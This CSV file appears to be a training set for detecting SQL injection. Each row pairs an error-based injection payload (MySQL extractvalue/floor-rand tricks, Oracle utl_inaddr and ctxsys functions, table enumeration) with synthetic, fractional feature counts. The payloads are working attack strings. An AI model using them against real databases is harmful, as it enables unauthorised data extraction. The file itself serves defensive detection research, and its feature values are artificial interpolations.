id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000388,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,1.7515861004440259,335.4182459950838,32.621499271833414,3.467626245129724,81.93224890775012,49.0,146.62149927183341,57.86449781550023,0.24426243204688658,0.14611951549264898,0.4371884667793605,0.1724295856811039,0.0,1.2429985436668223,0.0,0.0,0.0,2.3107496359167055,0.0,30.689250364083293,0.6214992718334114,0.0,1.0,22.310749635916704,0.0,0.3107496359167057,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.3107496359167057,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.3107496359167055
SMOTE_000389,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,1.115715645322273,323.9206723018009,37.68118127438862,3.9585802660034513,109.34059063719431,55.0,122.53653784144072,37.04354382316587,0.3383387921923107,0.17022614186988244,0.37722016401043745,0.1142149019273694,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.04354382316587,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.3405906371943113,0.6594093628056887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000390,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R000072,1.811202653084261,195.62224278975225,28.0,3.4711395457700904,46.459252403415924,37.703737982920394,86.08149519316815,25.377757210247765,0.23752811646722313,0.1926512813607522,0.44002615077569945,0.1297944513963252,1.8370096136636864,0.0,0.0,0.0,0.5407475965840783,2.0,0.0,16.0,0.0,0.0,4.459252403415921,2.5407475965840787,0.4592524034159217,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0814951931681565,0.0,0.0,0.5407475965840784,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.622242789752235
SMOTE_000391,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,1.0321746934338607,209.67962011677872,39.0,3.8277900885083804,63.0,37.0,86.0663500973156,23.613270019463123,0.30066322108851296,0.17657998698849176,0.4101776888383892,0.11257910308460614,0.6933649902684393,0.3066350097315607,1.0,0.0,1.0,0.9999999999999999,0.0,15.613270019463123,0.0,0.0,3.0,3.0,0.6933649902684393,0.30663500973156066,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000392,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,0.8248527867487275,208.7128598122527,33.571653713854836,3.6619829171551013,54.85721790461828,38.857743236946234,88.14120609839784,26.856692572290324,0.2631365609207652,0.18675686546538978,0.4216072356467849,0.12849933796706012,1.4283462861451621,0.0,1.7144358092365584,0.0,1.0,2.0,0.0,15.713910476908604,0.0,0.0,4.0,4.714435809236559,1.0,0.0,0.8572179046182793,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.8572179046182793,1.0,1.0,0.1427820953817207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000393,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,0.9096133184566209,342.27654227275735,34.0,3.6742857930569697,99.33121532472687,46.36172886362133,138.77813077921218,57.805467305196956,0.2898245009909717,0.13562198043412826,0.4056420358613573,0.1689114827135428,3.4164019155908596,0.0,0.1945326948030469,0.0,0.0,2.0,0.0,28.389065389606095,0.0,2.4164019155908587,0.1945326948030468,22.194532694803044,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.610934610393906,0.19453269480304694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.805467305196953
SMOTE_000394,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,1.2186062340443566,225.44500848700463,31.859334464933948,3.8819875171941987,78.7186689298679,40.4373378597358,81.28900169740092,25.0,0.3492589244456487,0.17898590479770066,0.36074407159135213,0.11101109916529844,3.1406655350660513,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,2.8593344649339487,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4296672324669744,0.0,0.42966723246697425,0.0,0.5703327675330256,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.429667232466974
SMOTE_000395,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.8162966147145801,224.97024029013954,32.57993134567441,3.480920422903875,58.42006865432559,33.15986269134883,102.97024029013956,30.420068654325586,0.25966601326577887,0.14775787763751977,0.45743354460915026,0.13514256448755108,0.0,3.5650514907441897,0.28996567283720676,0.0,1.0,1.1449828364186032,0.0,19.420068654325586,0.0,0.0,4.0,2.4349485092558094,0.0,1.0,0.14498283641860335,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.1449828364186033,1.0,1.8550171635813968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000396,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,1.8287913085598582,218.91849642577375,30.577517481153926,3.6963542262427374,65.17048947230991,37.84496503769215,88.59297199115599,27.310069924615703,0.29429852464681466,0.17651980477909562,0.4034745464682847,0.12570712410580503,4.0,0.0,0.0,0.0,0.0,1.5775174811539254,0.0,16.310069924615703,0.0,0.0,5.422482518846075,1.577517481153925,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.4224825188460746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5775174811539254,0.5775174811539254,4.577517481153926
SMOTE_000397,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,0.42665623371584316,194.27179947071158,28.271799470711596,3.500324030571208,48.08719788284638,35.0,84.4564010585768,26.728200529288404,0.2475057312754098,0.1801609045341024,0.43474593841801257,0.13758742577247524,4.0,0.0,0.0,0.0,0.0,1.7282005292884048,0.0,16.0,0.0,0.0,5.0,1.7282005292884053,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000398,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,1.1768357803367229,287.72325303303364,35.709343804161314,3.848416141993511,98.2560628249679,40.67475043329052,114.53637694980735,34.25606282496789,0.3435048519138221,0.14135484204292062,0.39597904238662224,0.11916126365663501,0.0,0.0,0.0,0.0,2.0,1.709343804161315,0.0,22.25606282496789,0.0,2.0,5.290656195838685,3.709343804161315,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.4186876083226303,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.41868760832263
SMOTE_000399,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,0.8942098221844862,231.80019189678652,40.34287084977046,3.8781248222883056,70.38578967373756,42.37148339908186,94.37148339908187,24.67143542488523,0.30334796546098125,0.18244635738848958,0.40753333888902726,0.10667233826150192,1.0,0.0,1.0,0.0,1.0,1.6714354248852328,0.0,16.0,0.0,0.0,3.0,3.6714354248852334,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.6714354248852328,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.671435424885233
SMOTE_000400,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000401,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000075,2.6538570341514136,337.82095902895475,33.05835618708269,3.4899548649867884,82.58753428062403,49.0,147.05835618708267,59.175068561248054,0.24446383522271453,0.14508564585673203,0.43538159257336095,0.17506892634719243,0.0,2.11671237416537,0.0,0.0,0.0,2.5291780935413426,0.0,30.47082190645866,1.058356187082685,0.0,1.0,22.52917809354134,0.0,0.5291780935413424,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5291780935413426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.529178093541343
SMOTE_000402,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000036,0.9211744921231355,335.12898236637596,39.0,3.859684703757764,104.06449118318798,55.0,135.06449118318798,41.0,0.31043985460411533,0.16418595270509695,0.40298102794698815,0.12239316474379955,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.516122795796996,1.4838772042030024,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000403,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.6750077011522118,336.0561696893375,34.0,3.4527366937862145,79.6479434368875,51.29588687377501,147.9363110971187,57.17602828155624,0.23703389920961454,0.15267826216894193,0.4401493714088633,0.17013846721258027,0.0,0.0,1.0,0.0,0.0,2.0,0.0,31.17602828155625,0.0,0.0,0.8239717184437536,23.0,0.0,0.0,0.0,0.1760282815562466,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8239717184437536,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.1760282815562465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000404,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,0.6984192888871533,279.15136952458045,36.26417279613233,4.03043765330058,108.26417279613233,37.64172796132331,99.11338236905866,34.132086398066164,0.38851747204456016,0.1340749461071602,0.3549402290669267,0.12246735278135297,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.264172796132332,0.0,1.735827203867669,5.132086398066166,4.132086398066166,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.396259194198497,0.3962591941984969,0.0,1.8679136019338345,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.8679136019338344,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.528345592264662
SMOTE_000405,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.5954992962207827,207.6190853139935,38.73015244766775,3.8334695852210587,63.0,37.0,84.61908531399351,23.0,0.3034895957413997,0.17823992130844113,0.40747269402869574,0.1107977889214634,0.7301524476677497,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,15.269847552332251,0.0,0.0,3.0,3.0,0.7301524476677496,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000406,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000034,1.9415335740104616,337.9478446803514,35.084946972253626,3.666629767249632,92.91505302774638,50.28763256936594,137.28763256936594,57.45752651387319,0.27498337606617307,0.148716583450084,0.40624703144038804,0.17005300904335485,0.4575265138731883,0.0,2.542473486126812,0.0,0.0,2.457526513873188,0.0,28.0,0.0,3.0,0.0,25.0,0.45752651387318827,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.4575265138731882,1.0,0.45752651387318805,0.5424734861268118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.457526513873188
SMOTE_000407,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,1.372025620220088,334.6938771093251,37.846938554662565,3.865203428794891,105.38775421865026,59.61224578134974,133.0,36.69387710932513,0.3148193893269475,0.17818557656144554,0.39739188159488653,0.10960315251672048,1.6938771093251297,0.0,0.0,0.0,2.0,2.0,0.0,24.0,0.0,0.0,6.0,5.0,0.4234692773312825,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000408,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,0.9789063894398987,309.2609638340484,38.219943303879504,4.053356615632887,110.58062365732548,55.0,110.34017008836149,33.34017008836149,0.3574091862910737,0.1779385090787425,0.35688310867021167,0.10776919595997214,3.1202267844819875,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,20.0,0.0,0.0,6.0,4.0,0.7800566961204968,0.0,0.0,0.21994330387950323,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.7800566961204969,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.780056696120496
SMOTE_000409,attack,error,"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",nearest_attack_euclidean,R000015,0.14795781279309217,190.40995156991062,26.117129019974463,3.3678424710737938,39.40995156991063,42.8243064700383,85.11712901997447,23.05856450998723,0.20691698335710673,0.22495298722418167,0.44703202325281177,0.1210980061658998,0.0,0.0,0.0,0.0,0.05856450998723295,2.0,0.0,16.0,0.0,0.0,4.941435490012767,2.0585645099872325,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.117129019974466,0.0,0.0,0.05856450998723295,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.175693529961699
SMOTE_000410,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,0.42469628804239573,217.54567867260698,32.852792507370765,3.5335112808356626,58.80964120946081,32.36801873157309,97.22081123894385,29.147207492629235,0.27018348840116285,0.14873476966120416,0.44707697289359655,0.13400476904403644,0.0,4.0,0.0,0.0,0.9263962536853819,1.073603746314618,0.0,18.0,0.14720749262923627,0.0,4.073603746314618,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.852792507370763,0.0,0.0,0.9263962536853819,1.0,0.9263962536853818,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.07360374631461819,0.07360374631461819,6.852792507370764
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,0.05194284671102035,218.59244563699968,30.98764986778787,3.852189449640782,76.65419629806033,37.02470026442426,79.91354907451509,25.0,0.350509419041249,0.16945276352285377,0.36563243473164503,0.11440538270425217,4.0,0.0,0.0,0.0,0.0,1.9876498677878687,0.0,14.0,0.0,0.0,5.0123501322121315,1.9876498677878693,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0123501322121313,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9876498677878687,0.9876498677878687,4.9876498677878685
